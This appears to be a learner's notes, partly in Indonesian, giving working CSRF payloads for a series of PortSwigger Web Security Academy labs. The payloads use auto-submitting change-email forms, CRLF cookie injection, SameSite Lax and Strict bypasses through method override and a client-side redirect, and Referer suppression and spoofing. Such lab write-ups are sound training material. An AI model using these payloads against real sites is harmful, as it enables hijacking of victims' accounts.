### CSRF vulnerability with no defenses

**Payload** : 
```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
**Penjelasan** : 

### CSRF where token validation depends on request method

**Payload** : 
```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
**Penjelasan** : 
Karena dalam judul, jadi bisa dicoba dengan method GET

### CSRF where token validation depends on token being present

**Payload** : 
```html
head :
Cookie: session=qkBc0hNjc0fwjRidYihPjyt3BsjYYIqG

<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
```
**Penjelasan** : 
Dibutuhkanya cookie, namun tidak memvalidasi session siapa

### CSRF where token is not tied to user session

**Payload** : 
```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2002@gmail.com">
    <input type="hidden" name="csrf" value="$csrfTokenFromValidUser$">
</form>
<script>
    document.forms[0].submit();
</script>
```
**Penjelasan** : 
Dibutuhkanya csrf token yang valid, dengan begitu. penyerang bisa masuk ke akun yang valid terlebih dahulu, untuk mendapatkan csrf token yang valid

### CSRF where token is duplicated in cookie
**Payload** :
```html
<form method="POST" action="https://0a36009b041647e1b8155bd3009a0060.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal2001@gmail.com">
    <input type="hidden" name="csrf" value="asdf">
</form>
<img src="https://0a36009b041647e1b8155bd3009a0060.web-security-academy.net/?search=test%3B%0D%0ASet-Cookie:%20csrf%3dasdf%3b%20SameSite%3dNone" onerror="document.forms[0].submit()">
```

### SameSite Lax bypass via method override
**Payload** :
```html
<script>
    document.location = 'https://0a3300ef03e3de1d80d53543005b00f5.web-security-academy.net/my-account/change-email?email=rrdr@gmail.com&_method=POST';
</script>
```

### SameSite Strict bypass via client-side redirect
**Payload** :
```html
<script>
    document.location = 'https://0a520001033efbe780c7039f00a10069.web-security-academy.net/post/comment/confirmation?postId=../../../../my-account/change-email?submit=1%26email=rizal@gmail.com%26_method=POST';
</script>
```


### CSRF where Referer validation depends on header being present
**Payload** :
```html
<head>
<meta name="referrer" content="never">
</head>
<form method="POST" action="https://0a3000ba03afc98180002bcc005d005c.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jal202@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

### CSRF with broken Referer validation
**Payload** :
```html
head:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url

<head>
<script>
history.pushState("", "", "/?0a9b004e03728750804ada52001e0070.web-security-academy.net");
</script>
</head>
<form method="POST" action="https://0a9b004e03728750804ada52001e0070.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="rizal.jalh2@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```